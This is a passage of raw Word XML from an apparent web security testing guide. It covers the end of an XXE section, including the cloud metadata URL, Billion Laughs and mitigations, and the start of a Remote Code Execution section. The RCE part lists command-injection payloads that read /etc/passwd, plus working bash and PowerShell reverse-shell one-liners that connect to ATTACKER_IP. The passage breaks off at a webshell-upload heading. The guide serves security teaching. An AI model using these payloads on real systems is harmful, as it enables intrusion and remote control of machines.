          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Cloud Metadata Theft: request </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r w:rsidR="006572CB" w:rsidRPr="00811C46">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>http://169.254.169.254/latest/meta-data/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0632D367" w14:textId="77777777" w:rsidR="006572CB" w:rsidRPr="006572CB" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>DoS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>: Billion Laughs expansion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FB1768" w14:textId="5BB69303" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Rare: RCE via unsafe XML parsers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BDA2FC" w14:textId="428D84F5" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="194" w:name="_Toc208408665"/>
      <w:r>
        <w:t>Tools</w:t>
      </w:r>
      <w:bookmarkEnd w:id="194"/>
    </w:p>
    <w:p w14:paraId="74226BD8" w14:textId="77777777" w:rsidR="00213F0C" w:rsidRDefault="00213F0C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>- Burp Suite Pro (active scan for XXE)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XXEinjector</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (automated file exfiltration)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- OAST/Burp Collaborator for Blind XXE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Custom scripts to inject crafted XML payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6790368D" w14:textId="6E42744B" w:rsidR="00213F0C" w:rsidRDefault="00213F0C" w:rsidP="00E428B8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1371153066"/>
      </w:pPr>
      <w:bookmarkStart w:id="195" w:name="_Toc208408666"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Mitigation Strategies</w:t>
      </w:r>
      <w:bookmarkEnd w:id="195"/>
    </w:p>
    <w:p w14:paraId="394FF56C" w14:textId="2289AD72" w:rsidR="006E278A" w:rsidRDefault="00213F0C" w:rsidP="006E278A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>- Disable DTDs and external ENTITY resolution in parsers.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>- Use secure XML parsers (with XXE disabled by default).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>- Replace XML with safer formats (JSON) when possible.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>- Validate XML strictly with XSD schemas.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Ensure the parser cannot access </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Times New Roman" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> or network resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CE1310" w14:textId="2ACF93F1" w:rsidR="005770B4" w:rsidRPr="003076DE" w:rsidRDefault="005770B4" w:rsidP="003076DE">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="196" w:name="_Toc208408667"/>
      <w:r>
        <w:t>Remote Code Execution (RCE)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="196"/>
    </w:p>
    <w:p w14:paraId="0ABE4753" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="003076DE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Remote Code Execution (RCE) is a vulnerability that allows an attacker to run arbitrary commands or code on a target system remotely. It can give attackers full control of the server, enabling data theft, lateral movement, or persistence. Common causes include unsafe command execution, insecure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> usage, deserialization flaws, or malicious file uploads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C2EDF4" w14:textId="6ED0352A" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="003076DE">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="197" w:name="_Toc208408668"/>
      <w:r>
        <w:t>Types of RCE</w:t>
      </w:r>
      <w:bookmarkEnd w:id="197"/>
    </w:p>
    <w:p w14:paraId="112F8954" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A) Direct Command Execution: input passed directly into system() or exec().</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">B) Code Injection: untrusted input evaluated by </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/exec.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>C) Deserialization RCE: attacker supplies malicious serialized objects.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">D) File Upload → RCE: upload </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or script executed by server.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>E) Dependency/Template Injection: SSTI, XXE leading to code execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B40D44" w14:textId="216B1282" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00F649EA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="198" w:name="_Toc208408669"/>
      <w:r>
        <w:t>Detection Workflow</w:t>
      </w:r>
      <w:bookmarkEnd w:id="198"/>
    </w:p>
    <w:p w14:paraId="016DDAED" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Identify potential sinks: system, exec, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, file uploads, deserialization.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Inject command separators (Unix: ;, &amp;&amp;, |, `  |  Windows: &amp;, ||).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Probe with harmless commands: ping -c 1 127.0.0.1, sleep 5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>4. Observe response/output or timing anomalies.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>5. Escalate to sensitive file reads or reverse shells in labs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7454D1" w14:textId="1387CC76" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00F649EA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="199" w:name="_Toc208408670"/>
      <w:r>
        <w:t>Exploitation Techniques</w:t>
      </w:r>
      <w:bookmarkEnd w:id="199"/>
    </w:p>
    <w:p w14:paraId="7FE6C1E5" w14:textId="2A7C3343" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00F649EA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="200" w:name="_Toc208408671"/>
      <w:r>
        <w:t>OS Command Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="200"/>
    </w:p>
    <w:p w14:paraId="52A9700B" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Payloads:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>127.0.0.1; cat /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">127.0.0.1 &amp;&amp; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>whoami</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>127.0.0.1 | id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493C2798" w14:textId="5A0B7ADB" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00F649EA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="201" w:name="_Toc208408672"/>
      <w:r>
        <w:t>Reverse Shells</w:t>
      </w:r>
      <w:bookmarkEnd w:id="201"/>
    </w:p>
    <w:p w14:paraId="23C7C4A4" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Linux:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> bash -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&amp; /dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/ATTACKER_IP/4444 0&gt;&amp;1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Windows (PowerShell):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>powershell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c "$client = New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>TypeName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>System.Text.ASCIIEncoding</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>GetString</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>($bytes,0,$i);$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sendback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>iex</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> $data 2&gt;&amp;1 | Out-String );$sendback2=$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>sendback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>+'PS '+(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">).Path+'&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41CF99ED" w14:textId="0DCF2BBE" w:rsidR="005770B4" w:rsidRDefault="005770B4" w:rsidP="00C6157F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:bookmarkStart w:id="202" w:name="_Toc208408673"/>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Upload</w:t>
      </w:r>
      <w:bookmarkEnd w:id="202"/>
    </w:p>
    <w:p w14:paraId="5450E479" w14:textId="77777777" w:rsidR="005770B4" w:rsidRDefault="005770B4">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="483813779"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
